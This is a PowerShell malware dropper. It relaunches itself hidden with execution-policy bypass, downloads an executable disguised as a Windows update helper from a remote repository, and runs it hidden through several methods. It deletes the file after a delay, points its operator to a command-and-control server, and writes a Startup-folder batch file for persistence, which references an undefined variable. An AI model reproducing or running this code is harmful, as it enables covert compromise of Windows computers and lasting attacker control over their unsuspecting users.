$ErrorActionPreference = 'SilentlyContinue'

# Hidden relaunch
if ($Host.Name -eq 'ConsoleHost') {
    Start-Job -ScriptBlock { param($p) Start-Process powershell -Arg "-ep Bypass -WindowStyle Hidden -File `"$p`"" -WindowStyle Hidden } -ArgumentList $MyInvocation.MyCommand.Path | Out-Null
    exit
}

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (!(Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$exePath = "$cache\WindowsUpdateHelper.exe"
$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/WindowsUpdateHelper.exe"

Write-Host "[DEBUG] Trying to download EXE..." -ForegroundColor Yellow

# AGGRESSIVE DOWNLOAD METHODS
$methods = @(
    { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 15 },
    { (New-Object System.Net.WebClient).DownloadFile($exeUrl, $exePath) },
    { Invoke-RestMethod -Uri $exeUrl -OutFile $exePath -TimeoutSec 15 }
)

$success = $false
foreach ($method in $methods) {
    try {
        & $method
        if ((Get-Item $exePath).Length -gt 10000) {  # assume real EXE >10KB
            Write-Host "[+] DOWNLOAD SUCCESS - $([math]::Round((Get-Item $exePath).Length/1KB,2)) KB" -ForegroundColor Green
            $success = $true
            break
        }
    } catch {
        Write-Host "[-] Method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    Start-Sleep -Seconds 3
}

if (-not $success) {
    Write-Host "[-] ALL DOWNLOAD METHODS FAILED. Manual fix required." -ForegroundColor Red
    Write-Host "Go to: https://github.com/astro-opensource/cloud-sync-tools/raw/main/assets/WindowsUpdateHelper.exe" -ForegroundColor Cyan
    Write-Host "Download manually → save as $exePath" -ForegroundColor Cyan
}

# EXECUTION IF EXE EXISTS
if (Test-Path $exePath) {
    Write-Host "[+] Executing payload with 4 methods..." -ForegroundColor Cyan
    try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" | Out-Null; "[+] WMI" } catch {}
    try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"",0,$false); "[+] WScript" } catch {}
    try { Start-Process $exePath -WindowStyle Hidden; "[+] Start-Process" } catch {}
    try { & $exePath } catch {}   # direct run last resort
    
    Start-Job { param($p) sleep 300; rm $p -Force } -Arg $exePath | Out-Null
    Write-Host "[+] PAYLOAD SHOULD BE RUNNING - CHECK C2 NOW" -ForegroundColor Green
} else {
    Write-Host "[-] Still no EXE. Fix internet or manual download." -ForegroundColor Red
}

# Persistence (quick version)
"powershell.exe -ep Bypass -WindowStyle Hidden -File `"$localPath`"" | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" -Encoding ASCII
